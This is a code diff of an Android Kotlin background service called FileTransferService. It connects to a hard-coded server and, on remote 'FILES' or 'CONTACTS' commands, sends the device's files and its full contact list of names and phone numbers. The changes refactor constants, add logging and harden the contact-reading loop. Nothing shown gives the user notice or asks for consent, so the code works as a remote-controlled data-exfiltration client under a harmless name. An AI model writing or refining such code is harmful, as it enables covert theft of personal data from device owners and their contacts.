@@ -20,9 +20,11 @@ import java.net.Socket
 
 class FileTransferService : Service() {
 
-    private val CHANNEL_ID = "FileTransferServiceChannel"
-    private val SERVER_IP = "192.168.236.32" // Replace with your server's IP address
-    private val SERVER_PORT = 8080
+    companion object {
+        const val SERVER_IP = "192.168.1.5"  // Replace with your server's IP address
+        const val SERVER_PORT = 8080
+        private const val CHANNEL_ID = "FileTransferServiceChannel"
+    }
 
     override fun onCreate() {
         super.onCreate()
@@ -40,11 +42,17 @@ class FileTransferService : Service() {
                 // Read command from server
                 val buffer = ByteArray(1024)
                 val bytesRead = inputStream.read(buffer)
-                val command = String(buffer, 0, bytesRead)
+                val command = String(buffer, 0, bytesRead).trim()
 
                 when (command) {
-                    "FILES" -> transferFiles(outputStream)
-                    "CONTACTS" -> transferContacts(outputStream)
+                    "FILES" -> {
+                        Log.i("FileTransferService", "Starting to transfer files...")
+                        transferFiles(outputStream)
+                    }
+                    "CONTACTS" -> {
+                        Log.i("FileTransferService", "Starting to transfer contacts...")
+                        transferContacts(outputStream)
+                    }
                     else -> Log.e("FileTransferService", "Unknown command: $command")
                 }
 
@@ -116,8 +124,15 @@ class FileTransferService : Service() {
 
     private fun transferContacts(outputStream: OutputStream) {
         val contacts = getContacts()
-        outputStream.write(contacts.toByteArray())
+        if (contacts.isNotEmpty()) {
+            outputStream.write(contacts.toByteArray())
+            outputStream.flush()
+            Log.d("FileTransferService", "Contacts data sent successfully")
+        } else {
+            Log.e("FileTransferService", "No contacts to send")
+        }
     }
+
 
     private fun getContacts(): String {
         val contactList = StringBuilder()
@@ -128,38 +143,50 @@ class FileTransferService : Service() {
         )
 
         cursor?.let {
+            val idIndex = it.getColumnIndex(ContactsContract.Contacts._ID)
+            val nameIndex = it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
+            val hasPhoneNumberIndex = it.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)
+
+            // Check if column indexes are valid
+            if (idIndex == -1 || nameIndex == -1 || hasPhoneNumberIndex == -1) {
+                Log.e("FileTransferService", "Column index not found")
+                return contactList.toString()
+            }
+
             if (it.count > 0) {
                 while (it.moveToNext()) {
-                    val idIndex = it.getColumnIndex(ContactsContract.Contacts._ID)
-                    val nameIndex = it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
-                    val hasPhoneNumberIndex = it.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)
-
-                    if (idIndex != -1 && nameIndex != -1 && hasPhoneNumberIndex != -1) {
-                        val id = it.getString(idIndex)
-                        val name = it.getString(nameIndex)
-                        if (it.getInt(hasPhoneNumberIndex) > 0) {
-                            val pCursor: Cursor? = resolver.query(
-                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                                null,
-                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
-                                arrayOf(id), null
-                            )
-                            pCursor?.let { phoneCursor ->
-                                while (phoneCursor.moveToNext()) {
-                                    val phoneNoIndex = phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
-                                    if (phoneNoIndex != -1) {
-                                        val phoneNo = phoneCursor.getString(phoneNoIndex)
-                                        contactList.append("Name: $name, Phone Number: $phoneNo\n")
-                                    }
-                                }
-                                phoneCursor.close()
+                    val id = it.getString(idIndex)
+                    val name = it.getString(nameIndex)
+                    if (it.getInt(hasPhoneNumberIndex) > 0) {
+                        val pCursor: Cursor? = resolver.query(
+                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                            null,
+                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+                            arrayOf(id), null
+                        )
+                        pCursor?.let { phoneCursor ->
+                            val phoneNoIndex = phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+                            if (phoneNoIndex == -1) {
+                                Log.e("FileTransferService", "Phone number column index not found")
+                                return contactList.toString()
                             }
+                            while (phoneCursor.moveToNext()) {
+                                val phoneNo = phoneCursor.getString(phoneNoIndex)
+                                contactList.append("Name: $name, Phone Number: $phoneNo\n")
+                            }
+                            phoneCursor.close()
                         }
                     }
                 }
+            } else {
+                Log.e("FileTransferService", "No contacts found")
             }
             it.close()
-        }
+        } ?: Log.e("FileTransferService", "Cursor is null")
+
         return contactList.toString()
     }
+
+
+
 }
